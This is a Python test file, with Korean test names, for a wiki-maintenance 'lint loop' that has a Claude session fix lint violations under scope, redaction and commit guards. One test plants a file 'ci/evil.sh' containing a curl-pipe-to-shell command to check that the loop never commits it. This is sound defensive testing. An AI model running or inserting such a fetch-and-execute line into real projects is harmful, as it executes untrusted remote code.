"""점검 루프: 점검 → 같은 세션으로 한 번 고침(G5·G9)."""

import asyncio
import dataclasses
import shutil
from collections.abc import Mapping
from pathlib import Path
from typing import Any

import pytest

import team_wiki_engine.sync.lint_loop as module
from team_wiki_engine.claude.types import RunClaudeInput
from team_wiki_engine.git.client import GitClient
from team_wiki_engine.git.ops import changed_paths
from team_wiki_engine.git.ops import commit_all as real_commit_all
from team_wiki_engine.sync.lint_loop import LintLoopResult, lint_loop
from tests.helpers import write_tree
from tests.helpers.git import init_repo
from tests.helpers.runner import ScriptedRunner

GOOD = "---\nupdated: 2026-10-07\n---\n\n# 목차\n"
TODAY = "2026-10-08"


class Drain:
    def __init__(self, pending: int = 0) -> None:
        self.pending = pending
        self.calls: list[float] = []

    async def __call__(self, timeout: float) -> int:
        self.calls.append(timeout)
        return self.pending


async def _repo(tmp_dir: Path) -> tuple[GitClient, RunClaudeInput]:
    git = await init_repo(tmp_dir / "data", {"wiki/index.md": "# frontmatter 없음\n"})
    inp = RunClaudeInput(
        profile="sync-code",
        prompt="원래 지시",
        cwd=git.cwd,
        read_roots=(git.cwd.parent,),
        write_roots=(git.cwd / "wiki",),
        timeout_ms=1000,
    )
    return git, inp


async def _loop(
    git: GitClient,
    inp: RunClaudeInput,
    runner: ScriptedRunner,
    *,
    session_id: str | None = "sess-0",
    reapply: Any = None,
    fix_commit_message: str = "wiki: 점검 수정",
    drain: Drain | None = None,
    redact: tuple[str, ...] = (),
) -> LintLoopResult:
    return await lint_loop(
        data_dir=git.cwd,
        git=git,
        runner=runner,
        inp=inp,
        session_id=session_id,
        reapply=reapply or (lambda: None),
        fix_commit_message=fix_commit_message,
        today=TODAY,
        drain=drain or Drain(),
        settle_timeout_s=5.0,
        redact=redact,
    )


async def _subjects(git: GitClient) -> list[str]:
    return (await git.run(["log", "--format=%s"])).text.split("\n")[:-1]


class TestLintLoop:
    async def test_위반_목록을_주고_같은_세션으로_한_번_고치게_한다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))
        reapplied: list[int] = []
        result = await _loop(git, inp, runner, reapply=lambda: reapplied.append(1))
        assert result.violations == ()
        assert len(result.runs) == 1
        assert result.failure is None
        assert runner.inputs[0].resume_session_id == "sess-0"
        assert "[L3] wiki/index.md" in runner.inputs[0].prompt
        assert runner.inputs[0].prompt.splitlines()[0] == "오늘 날짜: 2026-10-08"
        assert reapplied == [1]
        assert (await _subjects(git))[:2] == ["wiki: 점검 수정", "init"]

    async def test_커밋_순서는_수정_다음_기준_값_다시_맞춤이다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))
        # reapply가 기준 값 파일을 바꾸면 두 번째 커밋이 생긴다
        await _loop(
            git,
            inp,
            runner,
            reapply=lambda: write_tree(
                git.cwd,
                {
                    "baseline.json": '{"repos":{},"raw_processed":[],'
                    '"updated_at":"2026-10-08T09:00:00+09:00"}'
                },
            ),
        )
        assert (await _subjects(git))[:3] == [
            "chore: 기준 값 다시 맞춤",
            "wiki: 점검 수정",
            "init",
        ]
        assert await changed_paths(git) == []

    async def test_수정_입력은_prompt와_resume_session_id만_다르다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))
        await _loop(git, inp, runner)
        fix = runner.inputs[0]
        assert fix != inp
        assert dataclasses.replace(fix, prompt=inp.prompt, resume_session_id=None) == inp

    async def test_위반이_없으면_부르지_않는다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        write_tree(git.cwd, {"wiki/index.md": GOOD})
        runner = ScriptedRunner()
        drain = Drain()
        result = await _loop(git, inp, runner, drain=drain)
        assert runner.inputs == []
        assert drain.calls == []
        assert result == LintLoopResult((), (), None)

    async def test_세션이_없으면_부르지_않고_위반을_돌려준다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner()
        result = await _loop(git, inp, runner, session_id=None)
        assert runner.inputs == []
        assert len(result.violations) == 1
        assert result.violations[0].rule == "L3"
        assert result.runs == () and result.failure is None

    async def test_고친_뒤에도_남은_위반은_그대로_돌려준다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": "# 그대로\n"}))
        result = await _loop(git, inp, runner)
        assert len(result.violations) == 1
        assert result.failure is None
        assert len(result.runs) == 1

    async def test_범위_밖이면_되돌리고_실패로_알린다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(
            lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD, "raw/x.md": "x"})
        )
        reapplied: list[int] = []
        result = await _loop(git, inp, runner, reapply=lambda: reapplied.append(1))
        assert result.failure is not None
        assert "raw/x.md" in result.failure
        assert result.failure.startswith("허용 경로 밖 변경")
        assert len(result.violations) == 1  # 처음 위반 그대로
        assert await changed_paths(git) == []
        assert reapplied == []
        assert await _subjects(git) == ["init"]

    async def test_redact를_수정_실행의_사후_검사까지_넘긴다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        opaque = "correcthorsebatterystaple"
        long_dir = "d" * 100
        path = f"raw/{long_dir}/{long_dir}/{'e' * 80}{opaque}.md"  # 300자 경계에 걸친다
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {path: "x"}))
        result = await _loop(git, inp, runner, redact=(opaque,))
        assert result.failure is not None
        assert "correcth" not in result.failure
        assert opaque not in result.failure

    async def test_수정_실행이_log_md를_건드리면_실패하고_되돌려진다(self, tmp_dir: Path) -> None:
        # G5: 사후 검사가 로그를 쓰기 전에 돈다
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(
            lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD, "wiki/log.md": "forged\n"})
        )
        result = await _loop(git, inp, runner)
        assert result.failure is not None and "wiki/log.md" in result.failure
        assert not (git.cwd / "wiki" / "log.md").exists()
        assert (git.cwd / "wiki" / "index.md").read_text() == "# frontmatter 없음\n"

    async def test_수정_실행이_실패하면_반쯤_쓴_파일을_버리고_위반을_돌려준다(
        self, tmp_dir: Path
    ) -> None:
        git, inp = await _repo(tmp_dir)

        def script(i: RunClaudeInput, n: int) -> Mapping[str, Any]:
            write_tree(i.cwd, {"wiki/half.md": "쓰다 만"})
            return {"ok": False, "failure": "timeout"}

        reapplied: list[int] = []
        result = await _loop(git, inp, ScriptedRunner(script), reapply=lambda: reapplied.append(1))
        assert len(result.violations) == 1
        assert result.failure is None  # TS: PR은 점검 실패로 나간다
        assert len(result.runs) == 1 and result.runs[0].failure == "timeout"
        assert not (git.cwd / "wiki" / "half.md").exists()
        assert reapplied == []

    async def test_수정_실행이_unsettled이면_실패다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))
        reapplied: list[int] = []
        result = await _loop(
            git, inp, runner, drain=Drain(pending=1), reapply=lambda: reapplied.append(1)
        )
        assert result.failure == "정리되지 않은 Claude 실행이 남아 커밋하지 않음"
        assert len(result.violations) == 1
        assert len(result.runs) == 1
        assert await changed_paths(git) == []
        assert await _subjects(git) == ["init"]
        assert reapplied == []

    async def test_쓰기_루트가_안전하지_않으면_러너를_부르지_않고_실패다(
        self, tmp_dir: Path
    ) -> None:
        git, inp = await _repo(tmp_dir)
        (git.cwd / "wiki" / "escape").symlink_to(tmp_dir)
        runner = ScriptedRunner()
        result = await _loop(git, inp, runner)
        assert runner.inputs == []
        assert result.failure is not None and "링크" in result.failure
        assert result.runs == ()

    async def test_drain은_수정_실행마다_한_번_settle_timeout으로_불린다(
        self, tmp_dir: Path
    ) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))
        drain = Drain()
        await _loop(git, inp, runner, drain=drain)
        assert drain.calls == [5.0]


class TestLintLoopUsageError:
    async def test_wiki가_없으면_점검할_수_없다고_알리고_러너를_부르지_않는다(
        self, tmp_dir: Path
    ) -> None:
        git, inp = await _repo(tmp_dir)
        shutil.rmtree(git.cwd / "wiki")
        runner = ScriptedRunner()
        result = await _loop(git, inp, runner)
        assert runner.inputs == []
        assert result.failure is not None
        assert result.failure.startswith("점검을 할 수 없습니다")
        assert result.runs == ()

    async def test_다시_점검에서_사용_오류가_나도_실패다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))

        def reapply() -> None:
            shutil.rmtree(git.cwd / "wiki")

        result = await _loop(git, inp, runner, reapply=reapply)
        assert result.failure is not None
        assert result.failure.startswith("점검을 할 수 없습니다")
        assert len(result.runs) == 1

    async def test_사용_오류_메시지의_경로_비밀값은_가려진다(self, tmp_dir: Path) -> None:
        secret = "ghp_" + "A1b2C3d4E5f6G7h8I9j0" * 2
        git = await init_repo(tmp_dir / secret, {"raw/r.md": "r"})
        inp = RunClaudeInput("sync-code", "p", git.cwd, (), (git.cwd / "wiki",), 1000)
        result = await _loop(git, inp, ScriptedRunner())
        assert result.failure is not None
        assert secret not in result.failure
        assert len(result.failure) <= len("점검을 할 수 없습니다: ") + 201


class TestLintLoopFailureCleanup:
    async def test_reapply가_awaitable을_돌려주면_TypeError이고_변경을_버린다(
        self, tmp_dir: Path
    ) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))

        async def reapply() -> None:
            write_tree(git.cwd, {"baseline.json": "{}"})

        with pytest.raises(TypeError):
            await _loop(git, inp, runner, reapply=reapply)
        assert await changed_paths(git) == []

    async def test_reapply가_예외를_던지면_변경을_버리고_전파한다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))

        def reapply() -> None:
            write_tree(git.cwd, {"wiki/partial.md": "반쯤"})
            raise RuntimeError("reapply broke")

        with pytest.raises(RuntimeError, match="reapply broke"):
            await _loop(git, inp, runner, reapply=reapply)
        assert await changed_paths(git) == []
        assert (await _subjects(git))[0] == "wiki: 점검 수정"

    async def test_수정_커밋이_실패하면_변경을_버리고_전파한다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from team_wiki_engine.sync import lint_loop as module

        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))

        async def broken(g: GitClient, message: str) -> str | None:
            raise RuntimeError("commit broke")

        monkeypatch.setattr(module, "commit_all", broken)
        with pytest.raises(RuntimeError, match="commit broke"):
            await _loop(git, inp, runner)
        assert await changed_paths(git) == []
        assert (git.cwd / "wiki" / "index.md").read_text() == "# frontmatter 없음\n"


class _Suspend:
    def __await__(self) -> Any:
        yield


class TestLintLoopClose:
    async def test_코루틴을_닫아도_RuntimeError가_나지_않는다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from team_wiki_engine.claude.types import RunClaudeResult
        from team_wiki_engine.sync import lint_loop as module
        from team_wiki_engine.sync.claude_step import WriteStep
        from tests.helpers.runner import ok_result

        git, inp = await _repo(tmp_dir)

        async def instant_ok(**kwargs: Any) -> WriteStep:
            result: RunClaudeResult = ok_result()
            return WriteStep("ok", result)

        async def suspended(coro: Any) -> None:
            coro.close()
            await _Suspend()

        monkeypatch.setattr(module, "run_write_step", instant_ok)
        monkeypatch.setattr(module, "run_to_completion", suspended)
        coro = module.lint_loop(
            data_dir=git.cwd,
            git=git,
            runner=ScriptedRunner(),
            inp=inp,
            session_id="s",
            reapply=lambda: None,
            fix_commit_message="m",
            today=TODAY,
            drain=Drain(),
            settle_timeout_s=1.0,
        )
        coro.send(None)  # 커밋 묶음을 기다리는 곳에서 멈춘다
        coro.close()  # GeneratorExit: 기다리는 정리를 시도하면 RuntimeError


class TestLintLoopCancellation:
    async def test_수정_실행_중_취소하면_되돌리고_전파한다(self, tmp_dir: Path) -> None:
        git, inp = await _repo(tmp_dir)
        started = asyncio.Event()

        class Hang:
            async def __call__(self, i: RunClaudeInput) -> Any:
                write_tree(i.cwd, {"wiki/half.md": "x"})
                started.set()
                await asyncio.Event().wait()

        task = asyncio.create_task(
            lint_loop(
                data_dir=git.cwd,
                git=git,
                runner=Hang(),
                inp=inp,
                session_id="s",
                reapply=lambda: None,
                fix_commit_message="m",
                today=TODAY,
                drain=Drain(),
                settle_timeout_s=1.0,
            )
        )
        async with asyncio.timeout(10):
            await started.wait()
            task.cancel()
            with pytest.raises(asyncio.CancelledError):
                await task
        assert await changed_paths(git) == []


class TestLintLoopResultShape:
    def test_frozen(self) -> None:
        r = LintLoopResult((), (), None)
        with pytest.raises(dataclasses.FrozenInstanceError):
            r.failure = "x"  # type: ignore[misc]


class TestReapplyIsScoped:
    async def test_수정_커밋_뒤_사본이_더러우면_실패하고_더러운_것은_커밋되지_않는다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))

        async def dirtying(g: GitClient, message: str) -> str | None:
            result = await real_commit_all(g, message)
            if message == "wiki: 점검 수정":
                write_tree(g.cwd, {"ci/evil.sh": "curl x | sh\n"})  # 수정 커밋 뒤에 생긴 변경
            return result

        monkeypatch.setattr(module, "commit_all", dirtying)
        result = await _loop(git, inp, runner)
        assert result.failure is not None
        assert "ci/evil.sh" not in result.failure
        files = (await git.run(["log", "--name-only", "--format="])).text
        assert "ci/evil.sh" not in files
        assert await changed_paths(git) == []  # 되돌렸다

    async def test_기준_값_다시_맞춤은_baseline과_현황_페이지만_커밋한다(
        self, tmp_dir: Path
    ) -> None:
        git, inp = await _repo(tmp_dir)
        runner = ScriptedRunner(lambda i, n: write_tree(i.cwd, {"wiki/index.md": GOOD}))

        def reapply() -> None:
            write_tree(
                git.cwd,
                {"baseline.json": "{}\n", "wiki/status/w.md": "x\n", "wiki/other.md": "o\n"},
            )

        await _loop(git, inp, runner, reapply=reapply)
        files = (await git.run(["show", "--name-only", "--format=%s", "HEAD"])).text.split("\n")
        assert files[0] == "chore: 기준 값 다시 맞춤"
        assert sorted(f for f in files[1:] if f) == ["baseline.json", "wiki/status/w.md"]
